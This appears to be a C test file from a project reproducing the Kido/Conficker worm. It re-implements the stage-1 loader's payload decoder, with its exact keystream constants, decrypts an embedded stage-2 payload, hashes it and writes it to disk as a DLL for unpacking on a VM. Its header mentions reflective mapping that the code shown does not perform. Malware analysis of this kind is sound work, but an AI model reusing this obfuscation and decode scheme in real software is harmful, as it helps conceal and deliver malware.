/*====================================================================================
 *  KIDO reproduction - decoder test (built on host, run on VM)
 *
 *  Links the SAME loader code as stage-1, then:
 *    1. decodes the embedded g_stage2_enc with the exact original keystream
 *    2. maps the decoded stage-2 PE reflectively
 *    3. unpacks stage-2 with UPX semantics is NOT done here - instead it hands the
 *       decoded bytes to the caller so the test can also feed them to UPX -d on disk
 *
 *  Used to prove bit-exact decode of the embedded payload.
 *====================================================================================*/
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wincrypt.h>
#include <stdint.h>
#include <stdio.h>
#include "stage2_payload.h"

/* exact copy of the stage-1 decode (must stay in sync with loader.cpp) */
#define KIDO_K  0x0A0A0082u
#define KIDO_C1 0xC41972EBu
#define KIDO_C2 0x86E61B46u
#define KIDO_BLKXOR 0x37u
static void kido_decode(const uint32_t* enc, uint8_t* out, uint32_t ndw)
{
    for (uint32_t i = 0; i < ndw; ++i) {
        uint32_t key = ((((i | KIDO_K) << 1) ^ KIDO_C1) - KIDO_C2) & 0xFFFFFFFFu;
        uint32_t v   = enc[i ^ KIDO_BLKXOR] ^ key;
        out[i*4+0] = (uint8_t)(v        );
        out[i*4+1] = (uint8_t)(v >> 8  );
        out[i*4+2] = (uint8_t)(v >> 16 );
        out[i*4+3] = (uint8_t)(v >> 24 );
    }
}

int main(int argc, char** argv)
{
    static uint8_t stage2[STAGE2_ENC_SIZE];
    kido_decode(g_stage2_enc, stage2, STAGE2_ENC_DWORDS);

    /* md5 via CryptAcquireContext (host-agnostic) */
    HCRYPTPROV hp=0;
    BOOL ok = CryptAcquireContextA(&hp, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    if (ok){
        HCRYPTHASH hh;
        if (CryptCreateHash(hp, CALG_MD5, 0, 0, &hh) &&
            CryptHashData(hh, stage2, STAGE2_ENC_SIZE, 0)){
            BYTE md[16]; DWORD ml=16;
            CryptGetHashParam(hh, HP_HASHVAL, md, &ml, 0);
            char buf[64];
            for (int i=0;i<16;i++) sprintf(buf+2*i, "%02x", md[i]);
            printf("decoded-stage2-md5(erased) = %s\n", buf);
            CryptDestroyHash(hh);
        }
        CryptReleaseContext(hp, 0);
    }
    /* write the decoded stage-2 to disk so UPX -d can unpack it on the VM */
    FILE* f = fopen("decoded_stage2.dll", "wb");
    if (f){ fwrite(stage2,1,STAGE2_ENC_SIZE,f); fclose(f); printf("wrote decoded_stage2.dll (%u bytes)\n", STAGE2_ENC_SIZE); }
    return 0;
}
